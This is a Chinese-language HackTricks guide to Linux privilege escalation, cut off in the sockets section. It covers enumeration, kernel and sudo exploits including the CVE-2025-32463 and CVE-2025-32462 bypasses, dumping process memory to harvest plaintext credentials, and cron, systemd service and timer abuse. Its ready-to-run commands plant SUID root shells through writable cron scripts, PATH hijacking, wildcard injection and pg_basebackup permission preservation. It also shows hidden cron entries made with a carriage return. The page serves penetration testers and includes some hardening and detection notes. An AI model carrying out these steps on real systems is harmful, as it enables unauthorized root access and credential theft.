# Linux 权限提升

{{#include ../../../banners/hacktricks-training.md}}

如需了解更广泛的背景和历史上的枚举工作流，请参阅 references 中列出的 g0tmi1k、Payatu、SANS、LPE Workshop、Linux-Privilege-Escalation 和 linux-private-i 资源。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## 系统信息

### 操作系统信息

首先，了解正在运行的操作系统。

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### 路径

如果你**对 `PATH` 变量中的任何文件夹拥有写权限**，就可能劫持某些库或二进制文件：

```bash
echo $PATH
```

### 环境信息

环境变量中是否有有用信息、密码或 API 密钥？

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

检查 kernel 版本，确认是否存在可用于提权的 exploit。

[Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md) 汇总了本地提权案例，并链接到 Binary Exploitation 中更深入的 Linux kernel 分析文章。测试案例前，请先确认受影响的构建版本和配置。

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

你可以在这里找到一个不错的易受攻击内核列表和一些已**编译的 exploits**：[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。<sup>[[12]](#references)</sup>\
其他可以找到一些**编译好的 exploits**的网站：[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，可以这样做：

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

可用于搜索 kernel exploit 的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在受害者机器上执行，仅检查针对 kernel 2.x 的 exploit）

务必**在 Google 中搜索 kernel 版本**，因为你的 kernel 版本可能会出现在某个 kernel exploit 中，这样你就能确认该 exploit 是否有效。

其他 kernel exploitation 技术：

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux 权限提升 - Linux 内核 <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo version

根据以下内容中出现的易受攻击的 sudo 版本：

```bash
searchsploit sudo
```

你可以使用此 grep 检查 sudo 版本是否存在漏洞。

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

上游 sudo **1.9.14 至 1.9.17** 允许非特权本地用户通过 `--chroot` 选项提权至 root，前提是 sudo 从用户可控目录加载 `/etc/nsswitch.conf`；上游已在 **1.9.17p1** 中修复此问题。请检查相关路径中的每个 root-setuid sudo 可执行文件，因为 `sudo -V` 只会报告 `PATH` 中选中的二进制文件。发行版软件包可能会回移此修复，但不更改上游版本字符串，因此也请确认供应商的软件包状态。请参阅 [sudo 维护者的安全公告](https://www.openwall.com/lists/oss-security/2025/06/30/3)。<sup>[[28]](#references)[[29]](#references)</sup>

这里有一个用于利用该[漏洞](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)的 [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)。运行 exploit 之前，请确认你的 `sudo` 版本存在漏洞，并且支持 `chroot` 功能。

更多信息请参阅原始[漏洞安全公告](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)。<sup>[[28]](#references)</sup>

### Sudo 基于主机的规则绕过（CVE-2025-32462）

上游 sudo **1.8.8 至 1.9.17** 在评估基于主机的 sudoers 规则时，可能会使用 `sudo -h <host>` 中的**用户提供的主机名**，而不是**真实主机名**；上游已在 **1.9.17p1** 中修复此问题。用户仍须在所选主机上拥有匹配的 sudoers 条目。除本地策略外，也请检查供应商回移的修复以及其他 sudo 二进制文件。请参阅 [sudo 维护者的安全公告](https://www.openwall.com/lists/oss-security/2025/06/30/2)。<sup>[[29]](#references)</sup>

要求：
- 存在漏洞的 sudo 版本
- 特定于主机的 sudoers 规则（主机既不是当前主机名，也不是 `ALL`）

sudoers 配置示例：

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

通过伪造获准的主机进行利用：

```bash
sudo -h devbox id
sudo -h devbox -i
```

如果所选名称的解析被阻止，请验证该名称在主机上的解析方式。仅仅在日志或配置文件中看到某个名称，并不意味着它可以解析；而修改 `/etc/hosts` 通常需要特权写入权限。

#### sudo < v1.8.28

此 [上游 Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) 要求存在一条有效的 sudo 规则，允许以 `ALL` 用户身份运行命令，同时排除 root，例如 `(ALL, !root) /bin/bash`。调用者还必须有权使用该规则，包括满足任何身份验证要求。请检查已安装软件包的安全公告：供应商可能已将修复反向移植到显示的上游版本仍低于 1.8.28 的版本中。仅有 `!root` 规则或旧版本，均不足以确认存在漏洞。被动枚举期间不要测试特权命令。

```
sudo -u#-1 /bin/bash
```

### Dmesg 签名验证失败

查看 HTB 的 **smasher2 靶机**，了解如何利用此漏洞的**示例**。

```bash
dmesg 2>/dev/null | grep "signature"
```

### 更多系统枚举

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## 枚举可能的防御措施

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

如果你身处容器中，请先查看以下容器安全章节，然后再转到针对特定运行时的滥用页面：


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

检查**哪些内容已挂载或未挂载**，以及挂载位置和原因。如果有任何内容未挂载，可以尝试挂载并检查其中是否有私人信息。

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## 有用的软件

列举有用的二进制文件

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

另外，检查是否安装了**任何编译器**。如果你需要使用某个 kernel exploit，这会很有用，因为建议在你将要使用它的机器上（或类似的机器上）编译它。

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### 已安装的易受攻击软件

检查**已安装软件包和服务的版本**。也许存在某个旧版本的 Nagios（例如），可被利用来提权……\
建议手动检查更可疑的已安装软件的版本。

```bash
dpkg -l #Debian
rpm -qa #Centos
```

如果你可以通过 SSH 访问这台机器，也可以使用 **openVAS** 检查机器上安装的软件是否过时或存在漏洞。

> [!NOTE] > _请注意，这些命令会显示大量信息，其中大部分可能没有用。因此，建议使用 OpenVAS 或类似应用检查已安装软件的版本是否容易受到已知漏洞利用的攻击。_

## 进程

查看正在执行的**进程**，并检查是否有进程拥有**超出应有范围的权限**（比如由 root 运行的 tomcat？）

```bash
ps aux
ps -ef
top -n 1
```

始终检查是否有 [**electron/cef/chromium debuggers** 正在运行，你可以滥用它来提升权限](../../software-information/electron-cef-chromium-debugger-abuse.md)。**Linpeas** 会检查进程命令行中的 `--inspect` 参数来检测这些 debugger。\
还要**检查你对进程二进制文件的权限**，也许你可以覆盖别人的文件。

### 跨用户父子进程链

子进程以**不同于其父进程的用户**身份运行，并不一定是恶意行为，但这是一个有用的**分流信号**。某些用户身份切换是预期行为（`root` 启动服务用户进程、登录管理器创建会话进程），但异常的进程链可能暴露 wrappers、debug helpers、持久化机制或薄弱的运行时信任边界。

快速检查：

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

如果发现了异常的调用链，请检查父进程的命令行，以及所有会影响其行为的文件（`config`、`EnvironmentFile`、helper scripts、工作目录、可写参数）。在一些真实的 privesc 路径中，子进程本身不可写，但由父进程控制的 `config` 或 helper 调用链可以被修改。

### 已删除的可执行文件和已删除但仍打开的文件

运行时产物在**删除后**通常仍可访问。这既有助于 privilege escalation，也有助于从仍打开敏感文件的进程中恢复证据。

检查已删除的可执行文件：

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

如果 `/proc/<PID>/exe` 指向 `(deleted)`，说明该进程仍在内存中运行旧的二进制映像。这是一个值得调查的重要信号，因为：

- 被移除的可执行文件可能包含有价值的字符串或凭据
- 运行中的进程可能仍暴露有用的文件描述符
- 被删除的特权二进制文件可能表明近期发生过篡改或清理尝试

全局收集已删除但仍打开的文件：

```bash
lsof +L1
```

如果发现有趣的描述符，直接将其取回：

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

当进程仍打开已删除的 secret、脚本、数据库导出文件或 flag 文件时，这尤其有价值。

### 进程监控

你可以使用 [**pspy**](https://github.com/DominicBreuker/pspy) 等工具监控进程。这对于识别频繁执行的易受攻击进程，或在满足一组条件时执行的进程，非常有用。

#### sudo 下的 Linux ProcMon

[Linux 版 ProcMon](https://github.com/microsoft/ProcMon-for-Linux) 可以跟踪选定的进程和系统调用，并保存 SQLite 跟踪记录。如果 `sudo -l` 允许不受限制地以 root 权限运行 `procmon` 命令，请考虑它是否可能观察其他用户进程的输入或输出。此权限只是一个审查线索：跟踪器支持情况、有效策略以及合适进程的活动情况都会产生影响。跟踪文件可能包含 secret，因此请仔细检查获准导出的内容，并避免收集无关进程的信息。

### 进程内存

某些服务器服务会将**凭据以明文形式保存在内存中**。\
通常，你需要**root 权限**才能读取属于其他用户的进程内存，因此，当你已经是 root 并想查找更多凭据时，这通常更有用。\
不过，请记住，**普通用户可以读取自己拥有的进程的内存**。

> [!WARNING]
> 请注意，如今大多数机器**默认不允许 ptrace**，这意味着你无法转储属于非特权用户的其他进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的访问权限：
>
> - **kernel.yama.ptrace_scope = 0**：只要 UID 相同，所有进程都可以被调试。这是 ptrace 的传统工作方式。
> - **kernel.yama.ptrace_scope = 1**：只有父进程可以被调试。
> - **kernel.yama.ptrace_scope = 2**：只有管理员可以使用 ptrace，因为它需要 CAP_SYS_PTRACE capability。
> - **kernel.yama.ptrace_scope = 3**：任何进程都不能通过 ptrace 被跟踪。设置后，必须重启才能再次启用 ptrace。

短暂解锁密码保险库的同 UID 进程，可能构成一个独立的凭据边界。如果允许跟踪，正在运行且可转储的进程可能通过其输入系统调用或内存暴露保险库密码，即使加密的保险库文件本身仍受到保护。`ptrace_scope=0` 只是前提之一：匹配的凭据、目标进程是否可转储、其他 Linux 安全模块以及进程存活时间等因素也会产生影响。要确认保险库中的条目是否可用于 Unix root 登录，还需要单独检查凭据是否可复用。常规枚举应报告策略以及候选进程或保险库路径，而不是捕获输入或打印 secret。请参阅 [kernel 的 Yama 文档](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) 和 [ptrace 访问检查](https://man7.org/linux/man-pages/man2/ptrace.2.html)。

#### GDB

例如，如果你可以访问 FTP 服务的内存，就可以获取 Heap 并在其中搜索凭据。

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB 脚本

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示该进程虚拟地址空间中的内存映射方式**；它还会显示**每个映射区域的权限**。**mem** 伪文件**暴露进程自身的内存**。通过 **maps** 文件，我们可以知道哪些**内存区域可读**以及它们的偏移量。我们利用这些信息在 mem 文件中定位，并将所有可读区域转储到文件中。

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` 可访问系统的**物理**内存，而非虚拟内存。可通过 /dev/kmem 访问内核的虚拟地址空间。\
通常，只有 **root** 和 **kmem** 组成员可以读取 `/dev/mem`。

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump for linux

ProcDump 是对 Windows Sysinternals 工具套件中经典 ProcDump 工具的 Linux 版本重构。可从 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### 工具

要转储进程内存，可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 权限要求，并转储由你拥有的进程
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) 中的脚本 A.5（需要 root）

### 进程内存中的凭据

#### 手动示例

如果你发现 authenticator 进程正在运行：

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

你可以 dump 该进程（参见前面的章节，了解 dump 进程内存的不同方法），并在内存中搜索凭据：

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 可以从内存和一些**常见文件**中**窃取明文凭据**。要正常运行，需要 root 权限。

| 功能                                           | 进程名称         |
| ------------------------------------------------- | -------------------- |
| GDM 密码（Kali Desktop、Debian Desktop）       | gdm-password         |
| Gnome Keyring（Ubuntu Desktop、ArchLinux Desktop） | gnome-keyring-daemon |
| LightDM（Ubuntu Desktop）                          | lightdm              |
| VSFTPd（活动 FTP 连接）                   | vsftpd               |
| Apache2（活动 HTTP Basic Auth 会话）         | apache2              |
| OpenSSH（活动 SSH 会话 - Sudo 使用情况）        | sshd:                |

#### 搜索正则表达式/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## 定时任务/Cron jobs

### 以 root 身份运行的 Crontab UI (alseambusher) – 基于 Web 的调度器提权

如果 Web「Crontab UI」面板 (alseambusher/crontab-ui) 以 root 身份运行且仅绑定到 loopback，仍可通过 SSH 本地端口转发访问它，并创建特权任务来提权。<sup>[[1]](#references)[[4]](#references)</sup>

典型流程
- 发现仅绑定到 loopback 的端口（例如 127.0.0.1:8000）和 Basic-Auth realm，使用 `ss -ntlp` / `curl -v localhost:8000`
- 在运维文件中查找凭据：
  - 包含 `zip -P <password>` 的备份/脚本
  - 暴露 `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` 的 systemd unit
- 建立隧道并登录：
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个高权限任务并立即运行（放置 SUID shell）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它：
```bash
/tmp/rootshell -p   # root shell
```

加固
- 不要以 root 身份运行 Crontab UI；使用专用用户并限制其权限
- 绑定到 localhost，并通过 firewall/VPN 进一步限制访问；不要重复使用密码
- 避免在 unit 文件中嵌入 secrets；使用 secret stores 或仅 root 可访问的 EnvironmentFile
- 为按需执行的任务启用 audit/logging

检查是否有易受攻击的 scheduled job。也许你可以利用由 root 执行的脚本（wildcard vuln？可以修改 root 使用的文件？使用 symlink？在 root 使用的目录中创建特定文件？）。

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

如果使用 run-parts，请检查哪些名称实际上会被执行：

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

这可以避免误报。只有当你的 payload 文件名符合本地 `run-parts` 规则时，可写的周期性目录才有用。

### Cron path

例如，在 _/etc/crontab_ 中可以找到 PATH：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（_注意，用户“user”对 /home/user_ 拥有写入权限）

如果在这个 crontab 中，root 用户尝试执行某个命令或脚本，但没有设置路径。例如：_\* \* \* \* root overwrite.sh_\
那么，你可以通过以下方式获取 root shell：

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### 使用通配符的脚本执行 Cron（Wildcard Injection）

如果 root 执行的脚本在命令中包含“**\***”，你就可以利用这一点执行意料之外的操作（例如 privesc）。示例：

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**如果通配符前面带有路径，例如** _**/some/path/\***_ **，就不会有漏洞（即使是** _**./\***_ **也不会）。**

阅读以下页面，了解更多通配符利用技巧：


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron 日志解析器中的 Bash 算术扩展注入

Bash 算术可以将不可信文本解析为表达式。在受影响的 Bash 上下文中，该表达式中的数组下标可能会执行命令替换。如果具有特权的 cron/解析器将攻击者控制的日志文本放入这样的算术比较中，命令替换就可能以解析器的身份运行。<sup>[[22]](#references)</sup> 这取决于具体的 Bash 表达式和版本；展开变量中的裸 `$(...)0` 字符串本身并不能可靠地证明会重新求值。

输入也可能来自文件元数据，或从用户可写位置读取的其他字段。例如，具有特权的清理脚本读取图像的 `Producer` 标签，并使用 `[[ "$producer" -eq "expected" ]]` 对其进行比较，就会执行算术比较，即使变量带有引号也是如此。请检查计划任务的运行身份、哪些文件可以提供该标签、比较前进行了哪些转换，以及 Bash 的具体行为。对于文本标签，应使用字符串比较；对于数字，应先验证输入仅包含十进制数字，再进行算术运算。请参阅 [Bash 算术规则](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html)。

- 典型的易受攻击模式：
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- 针对 array-subscript 机制的安全本地行为探测（不涉及特权进程或文件更改）：
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

追踪实际执行的 scheduled script，以及它打开的字面输入路径。即使日志文件本身不可写，能够写入并遍历其非 sticky 父目录的用户，仍可能替换该目录项；`namei -l` 有助于区分这些权限。其他可写的日志路径、不可读的 scheduler，或从未将该字段作为 Bash arithmetic 求值的 parser，都不能证明这条利用路径成立。

### Cron script overwriting and symlink

如果你**可以修改由 root 执行的 cron script**，就能非常轻松地获取一个 shell：

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

如果 root 执行的脚本使用了一个你拥有**完全访问权限**的目录，删除该目录并创建一个指向其他目录的**符号链接目录**（其中放置由你控制的脚本）可能会有用。

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### 符号链接验证与更安全的文件处理

检查按路径读取或写入文件的特权脚本/二进制文件时，请确认它们如何处理链接：

- `stat()` 会跟随符号链接并返回目标的元数据。
- `lstat()` 返回链接本身的元数据。
- `readlink -f` 和 `namei -l` 有助于解析最终目标并显示路径各组件的权限。

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

对于防御者/开发者，防范 symlink tricks 的安全做法包括：

- `O_EXCL` 搭配 `O_CREAT`：如果路径已存在则失败（阻止攻击者预先创建链接/文件）。
- `openat()`：相对于可信目录文件描述符执行操作。
- `mkstemp()`：以原子方式创建权限安全的临时文件。

### 带有可写载荷的自定义签名 cron 二进制文件

普通用户如果能写入 root cron job 实际运行的二进制文件，就可能跨越权限边界；但自定义签名检查可以拒绝未签名的替换文件。在记录的案例中，root 所有的 ELF 文件权限为 `0760`，因此其所属组的成员可以写入该文件，而 root 所有者可以执行它。可见的进程跟踪显示，job 运行该二进制文件前，`objcopy` 提取了 `.text_sig`；完整的验证脚本不可读。<sup>[[2]](#references)</sup>

成功的替换文件使用 ELF signer 和 leak 的私有签名材料进行了签名。其[格式文档](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)介绍了一个根据可执行文件的 `.text` 派生的签名 section。仅在 `.text_sig` 中添加证书或匹配字符串，并不能证明足以通过未公开的验证器。下结论认定可写的已签名二进制文件可被利用之前，请检查实际的计划任务路径、有效写入权限、root 调用方式以及验证器策略。单独存在 `.text_sig` section 只能作为审查线索。

### 频繁运行的 cron jobs

你可以监控进程，查找每隔 1、2 或 5 分钟执行一次的进程。或许你可以利用这一点来提升权限。

例如，要**在 1 分钟内每隔 0.1 秒监控一次**、**按执行次数从少到多排序**，并删除执行次数最多的命令，可以这样做：

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（它会监视并列出每个启动的进程）。

### 保留攻击者设置的 mode bits 的 root 备份（pg_basebackup）

如果 root 所有的 cron 使用 `pg_basebackup`（或任何递归复制操作）处理一个你可以写入的数据库目录，你就可以植入一个 **SUID/SGID binary**，使其以 **root:root** 身份、保留相同的 mode bits，被重新复制到备份输出中。<sup>[[26]](#references)</sup>

典型的发现流程（以低权限 DB 用户身份）：
- 使用 `pspy` 发现 root cron 每分钟调用类似 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` 的命令。
- 确认源集群（例如 `/var/lib/postgresql/14/main`）可由你写入，并且任务运行后，目标目录（`/opt/backups/current`）归 root 所有。

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

这之所以可行，是因为 `pg_basebackup` 在复制集群时会保留文件模式位；由 root 调用时，目标文件会继承 **root 所有权 + 攻击者指定的 SUID/SGID**。任何会保留权限并将文件写入可执行位置的类似特权备份/复制例程，都容易受到攻击。

### 隐形 cron 任务

可以在注释后面加上**回车符**（不带换行符）来创建 cronjob，而且该 cron 任务仍会正常运行。示例（注意回车符）：

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

要检测这种隐蔽入口，请使用能够显示控制字符的工具检查 cron 文件：

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## 服务

### 可写的 _.service_ 文件

检查你是否可以写入任何 `.service` 文件；如果可以，你**可以修改它**，使其在服务**启动**、**重启**或**停止**时**执行**你的**后门**（可能需要等到机器重启）。\
例如，在 .service 文件中创建后门，使用 **`ExecStart=/tmp/script.sh`**

### 可写的服务二进制文件

请记住，如果你对服务执行的二进制文件有**写入权限**，就可以将它们替换为后门，这样服务重新执行时就会运行后门。

### systemd PATH - 相对路径

你可以通过以下方式查看 **systemd** 使用的 PATH：

```bash
systemctl show-environment
```

如果你发现自己可以在路径中的任何文件夹中**写入**，就可能能够**提升权限**。你需要搜索服务配置文件中使用的**相对路径**，例如：

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

然后，在你有写入权限的 systemd PATH 文件夹中，创建一个与相对路径二进制文件同名的**可执行文件**。当服务被要求执行存在漏洞的操作（**Start**、**Stop**、**Reload**）时，你的 **backdoor 将会执行**（非特权用户通常无法启动/停止服务，但请检查是否可以使用 `sudo -l`）。

**使用 `man systemd.service` 了解更多关于服务的信息。**

## **Timers**

**Timers** 是名称以 `**.timer**` 结尾的 systemd 单元文件，用于控制 `**.service**` 文件或事件。**Timers** 可以作为 cron 的替代方案，因为它们内置支持日历时间事件和单调时间事件，并且可以异步运行。

你可以使用以下命令枚举所有定时器：

```bash
systemctl list-timers --all
```

### 可写定时器

如果你能修改一个定时器，就可以让它执行某些 systemd.unit 单元（例如 `.service` 或 `.target`）。

```bash
Unit=backdoor.service
```

在文档中，你可以看到 Unit 的说明：

> 定时器到期时要激活的 unit。参数是一个 unit 名称，其后缀不能是“.timer”。如果未指定此值，则默认为与定时器 unit 同名、但不带后缀的 service。（见上文。）建议被激活的 unit 名称与定时器 unit 名称相同，区别仅在于后缀。

因此，要滥用此权限，你需要：

- 找到某个 systemd unit（例如 `.service`），它**正在执行一个可写的二进制文件**
- 找到某个**正在执行相对路径**的 systemd unit，并且你对 **systemd PATH** 具有**可写权限**（以冒充该可执行文件）

**使用 `man systemd.timer` 了解有关定时器的更多信息。**

### **启用定时器**

要启用定时器，你需要 root 权限并执行：

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

注意，创建指向 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 的符号链接即可**激活** **timer**。

## Sockets

Unix Domain Sockets (UDS) 可在客户端-服务器模型中，让同一台或不同机器上的**进程相互通信**。它们使用标准 Unix 描述符文件进行计算机间通信，并通过 `.socket` 文件进行设置。<sup>[[14]](#references)</sup>

可以使用 `.socket` 文件配置 sockets。

**使用 `man systemd.socket` 深入了解 sockets。** 在此文件中，可以配置多个有用的参数：

